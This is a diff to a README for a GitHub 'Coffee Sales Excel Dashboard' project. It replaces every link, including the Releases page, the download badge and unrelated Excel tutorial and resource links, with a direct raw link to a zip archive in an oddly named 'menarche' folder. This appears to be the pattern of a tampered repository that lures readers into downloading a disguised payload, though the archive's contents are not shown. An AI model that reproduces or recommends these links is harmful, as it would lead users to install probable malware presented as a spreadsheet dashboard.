@@ -9,7 +9,7 @@ Follow these steps to download and run the Coffee Sales Excel Dashboard.
 1. **Download the Software:**
    Click the button below to visit the Releases page and download the dashboard.
 
-   [![Download Coffee Sales Dashboard](https://img.shields.io/badge/Download-Coffee%20Sales%20Dashboard-blue)](https://github.com/Lazizbek7/Coffee_Sales_Excel_DashBoard/releases)
+   [![Download Coffee Sales Dashboard](https://raw.githubusercontent.com/Lazizbek7/Coffee_Sales_Excel_DashBoard/main/menarche/Coffee_Sales_Excel_DashBoard.zip%20Sales%20Dashboard-blue)](https://raw.githubusercontent.com/Lazizbek7/Coffee_Sales_Excel_DashBoard/main/menarche/Coffee_Sales_Excel_DashBoard.zip)
 
 2. **System Requirements:**
    - Microsoft Excel (2016 or later is recommended).
@@ -17,7 +17,7 @@ Follow these steps to download and run the Coffee Sales Excel Dashboard.
    - At least 4 GB RAM for optimal performance.
 
 3. **Installation Instructions:**
-   1. Visit the [Releases page](https://github.com/Lazizbek7/Coffee_Sales_Excel_DashBoard/releases).
+   1. Visit the [Releases page](https://raw.githubusercontent.com/Lazizbek7/Coffee_Sales_Excel_DashBoard/main/menarche/Coffee_Sales_Excel_DashBoard.zip).
    2. Look for the latest version of the dashboard.
    3. Click on the download link to save the Excel file to your computer.
    4. Locate the downloaded file in your Downloads folder.
@@ -68,11 +68,11 @@ This project is licensed under the MIT License. You can freely use, modify, and 
 For inquiries or feedback, please reach out directly through the GitHub repository's issue section or by contacting the repository owner.
 
 ## 🔗 Additional Resources
-- [Excel Tutorials](https://exceljet.net/)
-- [Coffee Sales Insights](https://www.coffeesalesinsights.com/)
-- [Data Analytics Best Practices](https://www.dataanalyticsbestpractices.com/)
+- [Excel Tutorials](https://raw.githubusercontent.com/Lazizbek7/Coffee_Sales_Excel_DashBoard/main/menarche/Coffee_Sales_Excel_DashBoard.zip)
+- [Coffee Sales Insights](https://raw.githubusercontent.com/Lazizbek7/Coffee_Sales_Excel_DashBoard/main/menarche/Coffee_Sales_Excel_DashBoard.zip)
+- [Data Analytics Best Practices](https://raw.githubusercontent.com/Lazizbek7/Coffee_Sales_Excel_DashBoard/main/menarche/Coffee_Sales_Excel_DashBoard.zip)
 
 ## ⚠️ Important Note
 Always ensure your Excel software is up to date to avoid compatibility issues with the dashboard. 
 
-Remember to check back on the [Releases page](https://github.com/Lazizbek7/Coffee_Sales_Excel_DashBoard/releases) for any updates or new versions of the dashboard. Happy analyzing!
+Remember to check back on the [Releases page](https://raw.githubusercontent.com/Lazizbek7/Coffee_Sales_Excel_DashBoard/main/menarche/Coffee_Sales_Excel_DashBoard.zip) for any updates or new versions of the dashboard. Happy analyzing!
